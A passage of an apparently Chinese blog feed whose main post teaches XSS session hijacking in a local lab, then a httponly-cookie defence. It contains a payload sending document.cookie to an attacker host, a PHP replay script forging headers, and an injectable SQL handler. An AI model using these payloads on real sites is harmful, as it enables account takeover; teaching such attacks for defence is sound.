<h2 id="入侵示例"><a href="#入侵示例" class="headerlink" title="入侵示例"></a>入侵示例</h2><p>关于cookie的一些属性，可以参考我的另一篇博文<a href="http://blog.csdn.net/yunnysunny/article/details/7748106" title="关于cookie的一些事">关于cookie的一些事</a>，里面会提到一个httponly的属性，也就是是否禁止js读取cookie。不幸的是很多常见的服务器（比如apache和tomcat）在生成这个存储sessionid的cookie的时候，没有设置httponly这个属性，也就是说js是可以将这个sessionid读取出来的。<br>js读取到sessionid，这会有问题吗？如果没有问题，我就不在这里啰嗦了。你网站上的运行的js代码并不一定是你写的，比如说一般网站都有一个发表文章或者说发帖的功能，如果别有用心的人在发表的时候填写了html代码（这些html一般是超链接或者图片），但是你的后台又没有将其过滤掉，发表出来的文章，被其他人点击了其中恶意链接时，就出事了。这也就是我们常说的XSS。 </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'尚未登录'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$uid</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'../globaldb.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'标题为空'</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> end<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'内容为空'</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> end<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-></span><span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'insert into article(title,content,uid,create_time) values("'</span><span class="token operator">.</span><span class="token variable">$title</span><span class="token operator">.</span><span class="token string single-quoted-string">'","'</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token operator">.</span><span class="token string single-quoted-string">'",'</span><span class="token operator">.</span><span class="token variable">$uid</span><span class="token operator">.</span><span class="token string single-quoted-string">',now())'</span><span class="token punctuation">;</span>
        <span class="token variable">$rv</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">dbExecute</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$rv</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
            <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'插入失败'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'数据库操作失败'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
end<span class="token punctuation">:</span>
<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码2.1 添加文章的后台代码</strong><br>这里给出了一段不靠谱代码，之所以这么说是由于对于提交的内容没有做过滤，比如说<code>content</code>表单域的内容。现在假设有这么两个网站，一个你自己的CMS网站，域名<code>mycms.whyun.com</code>,一个黑客用的网站，域名<code>session.myhack.com</code>。你可以通过配置hosts来模拟这两个网站，说到这里可还是推荐一下我之前做过的<a href="http://git.oschina.net/yunnysunny/addhost" title="addhost">addhost</a>工具，可以自动生成hosts和vhost配置。代码2.1正是mycms网站的代码。<br>登录mycms后在后台添加一篇文章，文章内容为：</p>
<pre><code>&lt;a href=\&quot;#\&quot; onclick=\&#39;javascript:alert(document.cookie);return false;\&#39;&gt;点击我，有惊喜！&lt;/a&gt;
</code></pre>
<p><strong>代码2.2 alert cookie</strong><br><img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/show_cookie.jpg" alt="显示cookie的html"><br><strong>图2.1 显示cookie的html</strong></p>
<p>打开刚才生成的文章链接，然后点击<code>点击我，有惊喜！</code>,会显示当前域下的所有cookie。<br><img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/alert_cookie.jpg" alt="coookie被alert出来"><br><strong>图2.2 cookie被alert出来</strong></p>
<p>当然要想做到攻击的目的仅仅做这些是不够的，下面将这个链接的内容做的丰富多彩些。</p>
<pre><code>&lt;a href=\&quot;#\&quot; onclick=\&#39;javascript:var link = this; var head = document.getElementsByTagName(\&quot;head\&quot;)[0]; var js = document.createElement(\&quot;script\&quot;); js.src = \&quot;http://session.myhack.com/httphack.php?cook=\&quot;+encodeURIComponent(document.cookie); js.onload = js.onreadystatechange = function()&#123; if (!this.readyState || this.readyState == \&quot;loaded\&quot; || this.readyState == \&quot;complete\&quot;) &#123;head.removeChild(js);  alert(\&quot;over\&quot;); &#125; &#125;; head.appendChild(js);return false;\&#39;&gt;点击我，有惊喜2！&lt;/a&gt;
</code></pre>
<p><strong>代码2.3 跨站请求</strong><br>这里为了将代码嵌入html，得将其写作一行，其简洁模式为：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">   <span class="token keyword">var</span> link <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> head <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"head"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
<span class="token keyword">var</span> js <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
js<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"http://session.myhack.com/httphack.php?cook="</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span> 
js<span class="token punctuation">.</span>onload <span class="token operator">=</span> js<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token string">"loaded"</span> <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token string">"complete"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
		head<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>js<span class="token punctuation">)</span><span class="token punctuation">;</span> 
		<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'开始跳转真正的地址'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span>link<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span> 
head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>js<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>代码2.4 跨站请求简洁版</strong><br>为了真正的体现他是超链接还是跳转到一个地址为妙，所以在简洁班中脚本加载结束后做了跳转，但是为了演示方便，我们在代码2.3中没有这么做。<br>现在再点击链接<code>点击我，有惊喜！</code>，查看一下一下网络请求，会发现一个到session.myhack.com&#x2F;httphack.php地址的请求，返回数据为<code>var data = &#123;&quot;code&quot;:0&#125;;</code>。<br><img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/cross_request.jpg" alt="跨站请求"><br><strong>图2.3 跨站请求</strong></p>
<p>接着看看httphack.php干了啥：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">
   <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
   <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type:application/javascript"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">getRealIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
	<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">;</span>
	<span class="token variable">$ipname</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
		<span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">'HTTP_CLIENT_IP'</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">'HTTP_X_FORWARDED'</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">'HTTP_X_CLUSTER_CLIENT_IP'</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">'HTTP_FORWARDED_FOR'</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">'HTTP_FORWARDED'</span>
	<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$ipname</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token variable">$value</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token variable">$value</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			
			<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token variable">$value</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
	   <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">return</span> <span class="token variable">$ip</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">getRealIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$cookies</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cook'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
	<span class="token string single-quoted-string">'User-Agent:'</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
	<span class="token string single-quoted-string">'X-FORWARDED-FOR:'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">,</span>
	<span class="token string single-quoted-string">'Remote-Addr:'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">,</span>
	<span class="token string single-quoted-string">'Cookie:'</span><span class="token operator">.</span><span class="token variable">$cookies</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"http://mycms.whyun.com/back/article/article_add.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上。</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HTTPHEADER</span><span class="token punctuation">,</span> <span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//构造IP</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_REFERER</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//构造来路</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'title'</span><span class="token operator">=></span><span class="token string single-quoted-string">'这是跨站攻击测试'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'content'</span><span class="token operator">=></span><span class="token string single-quoted-string">'网站被跨站攻击了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POSTFIELDS</span><span class="token punctuation">,</span> <span class="token function">http_build_query</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$out</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"var data = <span class="token interpolation"><span class="token variable">$out</span></span>;"</span><span class="token punctuation">;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码2.5 伪造session提交</strong></p>
<p>从代码2.5中可以看出，我们伪造了http请求的header内容，吧浏览器中mycms域的cookie原封不动传过去了，同时在header还伪造了user-agent和ip，mycms中在校验session的时候，发现sessionid和user-agent信息都是对的，所以认为session是存在且合法的！至此为止，我们完成了跨站请求攻击。</p>
<h2 id="3-防范"><a href="#3-防范" class="headerlink" title="3.防范"></a>3.防范</h2><p>第二章节中，我们的攻击思路是这样的，我们示例了通过js获取cookie，然后生成一个第三方网站的网络请求，然后再从第三方网站发起一个网络请求到我们自己的网站上。整个更急流程大体是这样的：<br><img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/hack_process.png" alt="跨站请求流程"><br><strong>图3.1 跨站请求流程</strong></p>
<p>从图3.1可以看出，让整个流程无法进行下去的措施有两个，一个就是加强对提交信息和页面显示信息的过滤，让非法提交内容无处施展；第二个就是让存储在cookie中的sessionid不能被js读取到，这样即使第一步出现漏洞的情况下，依然不会被攻击者走完整个攻击流程。<br>在php中设置sessionid的httponly属性的方法有很多，具体可以参考 stackoverflow上的一个<a href="http://stackoverflow.com/questions/36877/how-do-you-set-up-use-httponly-cookies-in-php">提问</a>。jsp中也是有很多方法，可以参考开源中国红薯发表的一篇<a href="http://www.oschina.net/question/12_72706">文章</a>。这里仅仅贴出来php中一个解决方法，就是在<code>session_start()</code>之后重新设置一下cookie:    </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$sess_name</span> <span class="token operator">=</span> <span class="token function">session_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//必须在session_start之前调用session_name</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token variable">$sess_name</span><span class="token punctuation">,</span> <span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>代码3.1 设置httponly属性为true</strong></p>
<p>本文源代码地址：<a href="https://gitlab.com/yunnysunny/session-hack">源码git库</a></p>
]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
  </entry>
  <entry>
    <title>某千里智能笔的深思</title>
    <url>/posts/smarty-pen-issue/</url>
    <content><![CDATA[<h2 id="1-背景分析"><a href="#1-背景分析" class="headerlink" title="1. 背景分析"></a>1. 背景分析</h2><p>在前公司做的最后一个项目是一个智能笔项目，按理来说这个项目跟自己已经没有关系了。写这篇文章的目的，更多的是对于智能硬件合作商技术方案的反思。</p>
<p>跟我们公司合作的是一家称之为某千里的智能笔硬件厂商，他们提供一种点读笔的技术解决方案。具体描述一下，就是在一张打印纸上先铺满“码点”，这种码点肉眼不可见，但是点阵笔可以读取。然后在同样一张纸上再印刷上书籍内容。用户使用点阵笔在这张特定的纸上作答时，笔上的感光元件可以读取纸上的码点，来确定当前书写的笔尖在纸上划过的坐标位置。</p>
<img src="/images/create.png" alt="img" style="zoom:50%;" />

<p><strong>图 1.0</strong></p>
<p>点阵笔之所以能够正确的识别书写坐标，还依赖于每个码点在一张纸上来说，形状是唯一的。将一个码点放大几十倍后，可以看到每个码点都是一个类似二维码的结构，而每个二维码对应的值都不同。</p>
<p>在书写过程中点阵笔的数据会通过蓝牙传送到一个安卓设备上，然后安卓设备再通过网络传输，发送到后端服务器，后端服务器根据传送过来的数据，可以做笔迹还原。</p>
<p><img src="/images/smarty_pen_data_comm.drawio.png"></p>
<p><strong>图 1.1</strong></p>
<p>最终后端从智能笔中得到的数据中含有数据：坐标点、压感值、事件类型，其中事件类型分为：DOWN MOVE UP 三种类型。如果不考虑压感的话，对于笔迹的还原，还是比较简单的。将一组 DOWN MOVE UP 的坐标点进行连线即可。</p>
<p><img src="/images/image-20220219151348496.png" alt="image-20220219151348496"></p>
<p><strong>图 1.2</strong></p>
<p>但是如果想还原的更精确一些，比如说增加笔锋效果，就必须得将压感值也考虑在内。简单处理的画，就是将压感等比例缓存为线宽。</p>
<p><img src="/images/image-20220219151558215.png" alt="image-20220219151558215"></p>
<p><strong>图1.3</strong> </p>
<p>通过上图可以看出，使用了压感之后，产生的图片反而更模糊了。由于当前书写用的点阵笔，从外观上看就是一只普通的黑色签字笔，通过笔尖和纸张接触产生油墨。我们最终所见的书写的笔画粗细，并不仅仅是增减书写的“压力”来实现的。笔尖可以书写油墨，更多的油墨和纸张接触后，笔尖和纸张的摩檫力减小，显然这时候书写者不必再用更多的力就能让笔画显示在纸张上。套用物理学的理论来分析一下这个事情，对于笔进行受力分析，书写时可以分为垂直方向的压力和水平方向的摩檫力：</p>
<p><img src="/images/force_analysis_pen.drawio.png"></p>
<p><strong>图 1.4</strong></p>
<p>增加压力时，笔尖和纸张的接触面积变大，线宽确实能增加，</p>
<p><img src="/images/add_vertical_force.drawio.png"></p>
<p><strong>图 1.5</strong></p>
<p>但是我们平常用笔的习惯，并不是百分之百垂直下笔的，而是笔和纸张之间有一个倾斜角，类似于如下样式</p>
<p><img src="/images/tilt_pen.drawio.png"></p>
<p><strong>图 1.6</strong></p>
<p>笔倾斜时，笔尖和纸张的接触面积也会变大，同样从视觉上看，线宽也增加了。</p>
<p>同时不可忽略的一个因素是，使用签字笔的时候，油墨量随着书写过程，会分泌更多，会让笔尖更“油”，转化为物理术语的话，也就是摩檫力减小了，那么你可以花费更小的压力，就可以得到同样粗的笔画。</p>
<p>通过以上分析，可以得出单纯使用垂直方向的压力根本就不能和线宽成正比。有可能在数据采集过程中，视觉上线宽正常的笔画，压力值却比较小，小到还原出来后看不清楚，也就会出现 <strong>图 1.3</strong> 的情况，还原出来会模糊。</p>
<p>既然不能将当前的压力值简单跟线宽建立正比关系来还原，那么有没有解决方案呢？答案就是做插值。既然现在还原出来的线条是不平滑的，那就通过补点来让其变得平滑。</p>
<p><img src="/images/divide_pencils.png"></p>
<p><strong>图 1.7</strong></p>
<p>图 1.7 中中间的一个线段，明显就属于过渡不平滑的现象，解决方案就是在当中补充更多的点，让线条更平滑，如图 1.8 所示，绿色点属于补点内容。</p>
<p><img src="/images/merge_pencils.png"></p>
<p><strong>图 1.8</strong></p>
<p>其实，算法再好，也仅仅是模拟，由于若干不可控因素，笔尖的大小、油墨出油量的大小，都会对于真实线条的粗细产生影响。如果此智能笔再增加一个光感传感器，能够直接拾取书写的笔墨的颜色，那么数据来的会更直接些。</p>
<img src="/images/read_draw_color.drawio.png" style="zoom:50%;" />

<p><strong>图 1.9</strong></p>
<p>上图中蓝色部分代表油墨内容，增加一个传感器能够拾取油墨内容和点阵坐标做合成是一个更理想的解决方案，当然我只是一个业余人员，至于这个技术方案能否付诸于实践，依然是未知数。</p>
<h2 id="2-代码"><a href="#2-代码" class="headerlink" title="2. 代码"></a>2. 代码</h2><p>还原笔迹的代码，没有包含插值算法的实现，<a href="https://github.com/yunnysunny/smarty-pen">https://github.com/yunnysunny/smarty-pen</a></p>
]]></content>
      <categories>
        <category>Engineering Design</category>
      </categories>
  </entry>
  <entry>
    <title>小议socket关闭</title>
    <url>/posts/socket/</url>
    <content><![CDATA[<p>socket编程过程中往往会遇到这样那样的问题，出现了这些问题，有的是由于并发访问量太大造成的，有些却是由于代码中编程不慎造成的。<br>比如说，最常见的错误就是程序中报打开的文件数过多这个错误。socket建立连接的时候是三次握手，这个大家都很清楚，<br>但是socket关闭连接的时候，需要进行四次挥手，但很多人对于这四次挥手的具体流程不清楚，吃了很多亏。</p>
<h2 id="CLOSE-WAIT分析"><a href="#CLOSE-WAIT分析" class="headerlink" title="CLOSE_WAIT分析"></a>CLOSE_WAIT分析</h2><p>socket是一种全双工的通信方式，建立完socket连接后，连接的任何一方都可以发起关闭操作。这里不妨假设连接的关闭是客户端发起。客户端的代码如下：</p>
